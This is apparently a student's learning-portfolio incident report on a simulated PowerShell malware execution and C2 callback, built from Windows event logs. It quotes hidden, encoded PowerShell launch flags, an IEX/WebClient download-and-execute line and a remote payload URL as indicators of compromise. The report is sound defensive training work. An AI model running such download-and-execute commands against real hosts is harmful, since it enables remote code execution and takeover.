# **PowerShell Malware Execution & C2 Callback — Incident Report (Case 02)**

**Author:** P. Guid
**GitHub:** [https://github.com/pguidry17](https://github.com/pguidry17)
**Project Type:** Learning Portfolio Case Study (Guided → Intermediate)
**Platform:** Windows 10
**Date of Analysis:** (Simulated Training Scenario)

---

## **1. Executive Summary**

In this investigation, I analyzed a set of suspicious Windows PowerShell event logs that indicated possible malware execution and command-and-control (C2) activity. The attacker used encoded and hidden PowerShell commands, downloaded a remote script from an external server, and established an outbound TCP connection for potential remote control.

This case helped me practice Windows log analysis, timeline reconstruction, IOC identification, and MITRE ATT&CK mapping at a more independent skill level.

---

## **2. Incident Overview**

| Category        | Details                                                          |
| --------------- | ---------------------------------------------------------------- |
| Threat Type     | PowerShell-Based Malware Execution + C2 Callback                 |
| Vector          | Malicious PowerShell execution                                   |
| Attacker IP     | 185.199.110.22                                                   |
| Victim Host     | 192.168.1.77                                                     |
| User Context    | WIN10-PC\jdoe                                                    |
| Malicious Tools | Encoded PowerShell, WebClient download, potential remote payload |
| Severity        | **High**                                                         |

---

## **3. Evidence Source**

Data was taken from Windows Event Log samples from:

* **EventID 4104** – PowerShell Script Block Logging
* **EventID 4688** – Process Creation
* **EventID 4689** – Process Termination
* **EventID 5156** – Filtering Platform (Network Connection)

---

## **4. Attack Timeline**

**03:12:55 —** PowerShell is launched with suspicious flags (`-nop -w hidden -EncodedCommand`), indicating obfuscated/hidden execution.
**03:12:56 —** A new PowerShell process (`powershell.exe`) is created using the same encoded and hidden command line.
**03:14:05 —** PowerShell downloads and executes a remote script from `http://185.199.110.22:8080/payload.ps1` using `IEX` and `Net.WebClient`.
**03:14:06 —** The malicious PowerShell process terminates with exit code `0x0`.
**03:14:07 —** The workstation establishes an outbound TCP connection to the attacker’s server on port **8080**, confirming potential C2 activity.

---

## **5. Indicators of Compromise (IOCs)**

| IOC Type            | Value                                                | Notes                               |
| ------------------- | ---------------------------------------------------- | ----------------------------------- |
| External IP         | **185.199.110.22**                                   | Attacker’s payload host / C2 server |
| Internal Host       | **192.168.1.77**                                     | Victim workstation                  |
| Malicious URL       | `http://185.199.110.22:8080/payload.ps1`             | Remote PowerShell script            |
| Suspicious Command  | `powershell -nop -w hidden -EncodedCommand <base64>` | Obfuscated execution                |
| Suspicious Download | `IEX(New-Object Net.WebClient).DownloadString(...)`  | Download + execute payload          |

---

## **6. MITRE ATT&CK Mapping**

| Tactic                | Technique                            | Evidence                                |
| --------------------- | ------------------------------------ | --------------------------------------- |
| **Execution**         | **T1059.001 — PowerShell**           | Encoded PowerShell used for execution   |
| **Execution**         | **T1105 — Ingress Tool Transfer**    | Payload downloaded from external server |
| **Command & Control** | **T1071.001 — Web Protocols (HTTP)** | Outbound HTTP/TCP to attacker           |
| **Defense Evasion**   | **T1027 — Obfuscated Information**   | `-nop -w hidden -EncodedCommand` flags  |

---

## **7. Impact Assessment**

| Category            | Rating             | Notes                                               |
| ------------------- | ------------------ | --------------------------------------------------- |
| Confidentiality     | **High**           | Attacker executed remote code with C2 communication |
| Integrity           | **Medium**         | Remote script execution → potential system changes  |
| Availability        | **Low**            | No evidence of disruption                           |
| Scope               | **Single Host**    | Activity isolated to 192.168.1.77                   |
| Attacker Capability | **High**           | Obfuscation, C2, payload hosting                    |
| Attack Progression  | **Execution + C2** | Serious compromise indicators                       |

**Overall Severity: HIGH**

---

## **8. Recommended Remediation**

### **Immediate Actions**

* Terminate malicious processes
* Block external IP: **185.199.110.22**
* Quarantine affected workstation
* Inspect any downloaded files (`payload.ps1`)
* Reset credentials for affected user account (WIN10-PC\jdoe)

### **Short-Term**

* Enable full PowerShell logging (4104/4103/4688)
* Review file system for persistence mechanisms (scheduled tasks, services, Run keys)
* Enforce application control to restrict PowerShell execution

### **Long-Term**

* Deploy EDR with behavior monitoring
* Restrict PowerShell usage via constrained language mode
* Implement egress filtering to limit outbound traffic
* Train users on phishing and suspicious behavior

---

## **9. Lessons Learned**

Through this case, I strengthened my ability to:

* Analyze Windows PowerShell logs
* Recognize encoded and obfuscated commands
* Identify malicious use of WebClient and IEX
* Map events to MITRE ATT&CK using a structured method
* Build a full attack timeline from discrete logs
* Determine severity and likely attacker intent

---
---

**End of Report**
*Author: P. Guid*

---
